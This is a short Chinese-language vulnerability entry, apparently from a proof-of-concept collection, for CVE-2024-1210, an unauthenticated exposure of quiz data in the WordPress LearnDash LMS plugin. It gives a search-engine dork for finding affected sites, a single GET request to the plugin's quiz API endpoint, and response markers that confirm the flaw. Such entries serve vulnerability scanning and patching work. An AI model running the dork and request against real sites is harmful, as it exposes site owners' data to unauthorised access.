﻿# WordPress Plugin LearnDash LMS 敏感信息未授权访问漏洞

> 更新时间：2024-03-26

> 漏洞编号：CVE-2024-1210

> 漏洞说明：WordPress和WordPress plugin都是WordPress基金会的产品。WordPress是一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。WordPress plugin是一个应用插件。

WordPress Plugin LearnDash LMS 4.10.1及之前版本存在安全漏洞，该漏洞源于容易通过API暴露敏感信息，未经身份验证的攻击者可能获得测验的访问权限。

> 漏洞特征：google:inurl:"/wp-content/plugins/sfwd-lms"

> 验证脚本：HTTP

```
GET /wp-json/ldlms/v1/sfwd-quiz HTTP/1.1

```

> 响应代码特征：200

> 响应内容特征：quiz_materials

> 上传文件定位：

> 验证文件来源：WordPress Plugin LearnDash LMS 敏感信息未授权访问漏洞.poc

